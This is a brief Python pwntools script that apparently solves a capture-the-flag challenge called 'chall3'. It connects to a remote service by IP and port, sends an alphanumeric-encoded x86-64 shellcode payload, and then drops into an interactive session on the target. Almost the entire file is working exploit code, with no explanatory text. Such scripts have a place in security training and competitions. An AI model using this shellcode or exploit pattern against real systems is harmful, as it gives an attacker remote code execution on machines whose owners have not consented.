from pwn import *
import binascii
import subprocess

file_crack = './chall3'
glibc = '/lib/x86_64-linux-gnu/libc.so.6'
domain_name = '202.38.93.241'
port = 10004
remo = 1
archive = 'amd64'

context(os='linux', arch=archive, log_level='debug')
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

def one_gadget(filename):
  return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))

def complement_code_32(num):
    return num & 0xffffffff
def complement_code_64(num):
    return num & 0xffffffffffffffff

elf = ELF(file_crack)
if remo:
    n = remote(domain_name, port)
else:
    n = elf.process()

pay = '''PPTAYAXVI31VXXXf-sof-0Pf-@@PZTAYAXVI31VXPP[_Hc4:14:SX-p(53-t __5T<o_P^14:WX-|o?~-@PB@-@@~AP_Hc4:14:SX-PP@y-t0 i5tp0YP^14:WX-|o?~-@PB@-@@~AP_Hc4:14:SX-$Ht -_`l 5O_W6P^14:WX-|o?~-@PB@-@@~AP_Hc4:14:SX-@"3@-p`  5TG/XP^14:WX-|o?~-@PB@-@@~AP_Hc4:14:SX-@3F2-p  ~5X/__P^14:WX-|o?~-@PB@-@@~AP_Hc4:14:SX- Gu - !`@5EW_wP^14:WX-|o?~-@PB@-@@~AP_SX- `Ba- @BA5X^{]P_Hc4:14:SX-*90 -E'  5n}?/P^14:WX-|o?~-@PB@-@@~AP_SX- `@a- @PA5\^o]P^SX-@@@"-y``~5____P_AAAAf[V??71_w2GXb:Wk_|;*Yw[R1?oScSFGA1tMrh`$hpiAEE4 G~/yW<NywB),6!xxyo>_!L6nH$lqk_AvA<zD~Cx>f0Rj;XNE]]"`">)]'''
n.send(pay)
n.interactive()
